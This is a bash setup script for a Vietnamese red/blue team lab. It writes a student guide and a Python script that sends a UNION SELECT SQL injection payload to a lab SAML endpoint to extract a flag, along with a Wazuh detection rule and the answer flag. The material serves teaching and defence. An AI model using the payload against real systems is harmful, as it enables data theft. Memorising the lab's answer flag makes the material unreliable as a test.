#!/bin/bash
# ==============================================================================
# fixlocal.sh for student-pc (saml-wazuh-sqli)
# ==============================================================================

# 1. Cấu hình /etc/hosts
grep -q "$(hostname)" /etc/hosts 2>/dev/null || echo "127.0.0.1 $(hostname)" | sudo tee -a /etc/hosts >/dev/null 2>&1
grep -q "sp.lab" /etc/hosts 2>/dev/null || echo "172.20.0.10 sp-server sp.lab" | sudo tee -a /etc/hosts >/dev/null 2>&1
grep -q "student-pc" /etc/hosts 2>/dev/null || echo "172.20.0.20 student-pc" | sudo tee -a /etc/hosts >/dev/null 2>&1
grep -q "wazuh.lab" /etc/hosts 2>/dev/null || echo "172.20.0.30 wazuh-manager wazuh.lab" | sudo tee -a /etc/hosts >/dev/null 2>&1

# 2. Đảm bảo kết nối X11 Socket & Wrapper script cho Burp Suite Community
sudo mkdir -p /tmp/.X11-unix
if [ -d /var/tmp/.X11-unix ]; then
    for sock in /var/tmp/.X11-unix/*; do
        if [ -e "$sock" ]; then
            base=$(basename "$sock")
            sudo ln -sf "$sock" "/tmp/.X11-unix/$base" 2>/dev/null || true
        fi
    done
fi
sudo chmod 1777 /tmp/.X11-unix 2>/dev/null || true

# Tự động chấp nhận điều khoản EULA của Burp Suite nếu chưa có
mkdir -p /home/ubuntu/.java/.userPrefs/burp
if [ ! -f /home/ubuntu/.java/.userPrefs/burp/prefs.xml ]; then
    cat << 'EOF_PREFS' > /home/ubuntu/.java/.userPrefs/burp/prefs.xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE map SYSTEM "http://java.sun.com/dtd/preferences.dtd">
<map MAP_XML_VERSION="1.0">
  <entry key="eulacommunity" value="4"/>
</map>
EOF_PREFS
    touch /home/ubuntu/.java/.userPrefs/.user.lock.ubuntu /home/ubuntu/.java/.userPrefs/.userRootModFile.ubuntu
fi
sudo chown -R ubuntu:ubuntu /home/ubuntu/.java 2>/dev/null || true

if [ -d /usr/local/BurpSuiteCommunity ]; then
    sudo rm -f /usr/local/bin/burpsuite /usr/bin/burpsuite /usr/local/bin/burp /usr/bin/burp
    sudo tee /usr/local/bin/burpsuite > /dev/null << 'EOF'
#!/bin/bash
# Đảm bảo symlink X11 socket tồn tại
mkdir -p /tmp/.X11-unix
if [ -d /var/tmp/.X11-unix ]; then
    for sock in /var/tmp/.X11-unix/*; do
        if [ -e "$sock" ]; then
            base=$(basename "$sock")
            ln -sf "$sock" "/tmp/.X11-unix/$base" 2>/dev/null || true
        fi
    done
fi

if [ -z "$DISPLAY" ]; then
    export DISPLAY=:0
fi

exec /usr/local/BurpSuiteCommunity/BurpSuiteCommunity "$@"
EOF
    sudo chmod 755 /usr/local/bin/burpsuite
    sudo cp -a /usr/local/bin/burpsuite /usr/bin/burpsuite
    sudo cp -a /usr/local/bin/burpsuite /usr/local/bin/burp
    sudo cp -a /usr/local/bin/burpsuite /usr/bin/burp
fi

# 3. Tạo thư mục Desktop và các shortcut
mkdir -p /home/ubuntu/Desktop
if [ -f /usr/share/applications/burpsuite.desktop ]; then
    cp /usr/share/applications/burpsuite.desktop /home/ubuntu/Desktop/
    chmod +x /home/ubuntu/Desktop/burpsuite.desktop
fi

# 4. Script kiểm tra kết nối mạng
cat << 'EOF_TEST' > /home/ubuntu/test_connection.sh
#!/bin/bash
echo "=== KIỂM TRA KẾT NỐI MẠNG ĐẾN CÁC MÁY CHỦ TRONG BÀI LAB ==="
echo "1. Ping sp-server (172.20.0.10)..."
ping -c 2 172.20.0.10 || echo "[-] KHÔNG THỂ PING SP-SERVER (Có thể IP đã bị Active Response chặn!)"

echo ""
echo "2. Kiểm tra dịch vụ Service Provider Portal (Port 5000)..."
curl -I -s --connect-timeout 3 http://172.20.0.10:5000 | head -n 3 || echo "[-] KHÔNG THỂ KẾT NỐI PORT 5000 (Đã bị chặn bởi iptables firewall-drop!)"

echo ""
echo "3. Kiểm tra dịch vụ Keycloak IdP (Port 8080)..."
curl -I -s --connect-timeout 3 http://172.20.0.10:8080 | head -n 3 || echo "[-] KHÔNG THỂ KẾT NỐI PORT 8080"

echo ""
echo "4. Ping wazuh-manager (172.20.0.30)..."
ping -c 2 172.20.0.30
EOF_TEST
chmod +x /home/ubuntu/test_connection.sh

# 5. Script thực thi Red Team SQLi tự động (tuỳ chọn cho sinh viên)
cat << 'EOF_PY' > /home/ubuntu/Desktop/redteam_sqli_test.py
#!/usr/bin/env python3
"""
Kịch bản kiểm thử Red Team: SAML NameID SQL Injection
Tự động gửi payload UNION SELECT tới endpoint /saml/acs của sp-server
"""
import urllib.request
import urllib.parse
import re

TARGET_URL = "http://172.20.0.10:5000/saml/acs"
PAYLOAD = "admin' UNION SELECT secret_key, 'Enterprise Administrator', secret_value, 'admin@corp' FROM secret_data --"

print("[*] Đang gửi payload SQL Injection tới " + TARGET_URL + "...")
print("[*] Payload: " + PAYLOAD)

data = urllib.parse.urlencode({
    "direct_test": "true",
    "raw_nameid": PAYLOAD
}).encode('utf-8')

req = urllib.request.Request(TARGET_URL, data=data)
try:
    with urllib.request.urlopen(req, timeout=5) as response:
        body = response.read().decode('utf-8')
        flag_match = re.search(r'(FLAG\{[^}]+\})', body)
        if flag_match:
            print("\n" + "="*60)
            print("[+] TẤN CÔNG THÀNH CÔNG! ĐÃ TRÍCH XUẤT ĐƯỢC FLAG:")
            print("    " + flag_match.group(1))
            print("="*60)
            print("[*] Chạy lệnh: submit_flag " + flag_match.group(1) + " để lưu cờ!")
        else:
            print("[+] Yêu cầu đã được gửi. Kiểm tra giao diện web để xem kết quả.")
except Exception as e:
    print("\n[-] KHÔNG THỂ GỬI YÊU CẦU: " + str(e))
    print("[!] Điều này chứng tỏ máy chủ sp-server đã CHẶN HOÀN TOÀN IP của bạn qua iptables Active Response!")
EOF_PY
chmod +x /home/ubuntu/Desktop/redteam_sqli_test.py

# 6. Tạo script nộp flag trên Desktop
cat << 'EOF_FLAG_SH' > /home/ubuntu/Desktop/submit_flag.sh
#!/bin/bash
if [ -z "$1" ]; then
    echo "Sử dụng: ./submit_flag.sh <chuỗi_flag>"
    exit 1
fi
/usr/local/bin/submit_flag "$1"
EOF_FLAG_SH
chmod +x /home/ubuntu/Desktop/submit_flag.sh

# 7. Hướng dẫn chi tiết bài lab
cat << 'EOF_GUIDE' > /home/ubuntu/Desktop/HUONG_DAN_THUC_HANH.txt
================================================================================
BÀI THỰC HÀNH: TẤN CÔNG SAML SQL INJECTION VÀ PHÒNG THỦ SIEM WAZUH (saml-wazuh-sqli)
================================================================================

🎯 MỤC TIÊU HỌC TẬP:
- Red Team: Khai thác lỗ hổng SQL Injection (CWE-89) tại tham số NameID của SAML Assertion.
  Trích xuất cờ bí mật (Secret Flag).
- Blue Team: Viết Custom Rule trên Wazuh SIEM để nhận diện đòn tấn công từ nhật ký JSON.
  Kích hoạt cơ chế Active Response (firewall-drop qua iptables) để chặn IP kẻ tấn công.
- Đánh giá: Chạy lệnh `checkwork` để chấm điểm 5 tiêu chí tự động.

🌐 MÔ HÌNH HỆ THỐNG:
- sp-server (172.20.0.10): Cổng dịch vụ Service Provider (Port 5000), IdP (Port 8080).
- wazuh-manager (172.20.0.30): Máy chủ giám sát SIEM, tiếp nhận log và điều khiển Active Response.
- student-pc (172.20.0.20): Máy trạm kiểm thử (Red Team & Blue Team).

⚙️ CÁC BƯỚC THỰC HIỆN CHI TIẾT:

--------------------------------------------------------------------------------
GIAI ĐOẠN 1: KHAI THÁC SQL INJECTION (RED TEAM)
--------------------------------------------------------------------------------
Bước 1.1: Mở Firefox trên student-pc:
   firefox http://172.20.0.10:5000 &
   (Hoặc sử dụng Burp Suite để chặn gói tin SAMLResponse).

Bước 1.2: Sử dụng bảng "Red Team Console" tại trang chủ hoặc chèn payload vào NameID:
   admin' UNION SELECT secret_key, 'Enterprise Administrator', secret_value, 'admin@corp' FROM secret_data --

Bước 1.3: Nhấn "Thực thi gói tin SAMLResponse".
   Quan sát bảng dữ liệu trả về xuất hiện cờ bí mật:
   FLAG{SAML_SQLI_WAZUH_ACTIVE_RESPONSE_2026}

Bước 1.4: Nộp cờ bằng lệnh:
   submit_flag FLAG{SAML_SQLI_WAZUH_ACTIVE_RESPONSE_2026}
   (Hệ thống ghi nhận Goal 1: 1_sqli_executed và Goal 5: 5_flag_submitted).

--------------------------------------------------------------------------------
GIAI ĐOẠN 2: PHÒNG THỦ BẰNG WAZUH SIEM (BLUE TEAM)
--------------------------------------------------------------------------------
Bước 2.1: Chuyển sang cửa sổ terminal của wazuh-manager (hoặc ssh ubuntu@172.20.0.30).

Bước 2.2: Chỉnh sửa tệp cấu hình rules:
   nano /var/ossec/etc/rules/local_rules.xml

   Thêm đoạn rule sau vào bên trong thẻ <group name="sp_portal,saml,">:
   <rule id="100201" level="12">
     <match>UNION|SELECT|--</match>
     <description>SAML SQL Injection Attack Detected</description>
     <group>sqli,attack,</group>
   </rule>

Bước 2.3: Lưu tệp (Ctrl+O, Enter, Ctrl+X) và kiểm tra lại cú pháp:
   check_rules
   (Hệ thống ghi nhận Goal 2: 2_wazuh_rule_created).

--------------------------------------------------------------------------------
GIAI ĐOẠN 3: KIỂM CHỨNG CƠ CHẾ ACTIVE RESPONSE
--------------------------------------------------------------------------------
Bước 3.1: Quay lại student-pc, thực hiện lại đòn tấn công SQL Injection:
   Chạy script:
   python3 /home/ubuntu/Desktop/redteam_sqli_test.py
   (hoặc gửi lại payload trên web / Burp Suite).

Bước 3.2: Quan sát:
   - Wazuh Manager phát hiện log JSON chứa từ khóa SQLi, kích hoạt Rule 100201.
   - Manager gửi tín hiệu Active Response tới sp-server.
   - sp-server thực thi script firewall-drop ghi nhận vào /var/ossec/logs/active-responses.log
     (Hệ thống ghi nhận Goal 3: 3_active_response_triggered).
   - iptables trên sp-server lập tức chèn luật DROP mọi gói tin từ IP 172.20.0.20
     (Hệ thống ghi nhận Goal 4: 4_attacker_blocked).

Bước 3.3: Kiểm tra mất kết nối:
   Chạy lệnh:
   ./test_connection.sh
   (Ping và curl tới sp-server đều thất bại do đã bị iptables chặn hoàn toàn).

--------------------------------------------------------------------------------
GIAI ĐOẠN 4: ĐÁNH GIÁ KẾT QUẢ (CHECKWORK)
--------------------------------------------------------------------------------
Tại terminal của student-pc, chạy lệnh:
   checkwork

Kết quả hoàn thành đầy đủ 5 tiêu chí:
   1_sqli_executed : SUCCESS (Y)
   2_wazuh_rule_created : SUCCESS (Y)
   3_active_response_triggered : SUCCESS (Y)
   4_attacker_blocked : SUCCESS (Y)
   5_flag_submitted : SUCCESS (Y)
================================================================================
EOF_GUIDE

sudo chown -R ubuntu:ubuntu /home/ubuntu 2>/dev/null || true
